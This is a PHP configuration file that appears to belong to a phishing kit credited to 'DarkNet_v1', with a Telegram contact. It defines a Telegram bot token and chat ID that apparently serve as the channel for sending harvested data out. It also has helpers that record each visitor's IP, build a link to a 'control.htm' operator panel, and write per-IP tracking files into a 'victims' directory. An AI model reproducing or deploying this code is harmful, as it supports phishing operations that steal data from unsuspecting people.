<?php 

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/


    // telegram bot informatoin 

    /* Enter your Bot_Token => */ define('BOT_TOKEN' , '6551387568:AAHE6ML_3ym0hz38uvt9X84O52V261QQDQQ');
    /* Enter your Chat_id => */   define('CHAT_ID'   , '6640053788');


    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    
    function get_steps_link() {
    
        $ex = explode('/',$_SERVER['REQUEST_URI']);
        array_shift($ex);
        for($i = 1; $i <= 3 ; $i++) {
            array_pop($ex);
        }
        $im = '/' . implode('/',$ex) . '/';
    
        $url = "http://". $_SERVER['HTTP_HOST'] . $im;
        $x = pathinfo($url);
    
        return $ee = $x['dirname'] . '/control.htm?ip=' . get_client_ip();
    }
    
     
    function reset_data() {
        $fp = fopen('../../../victims/'. get_client_ip() .'.txt', 'wb');
        fwrite($fp, 0);
        fclose($fp);
    }



?>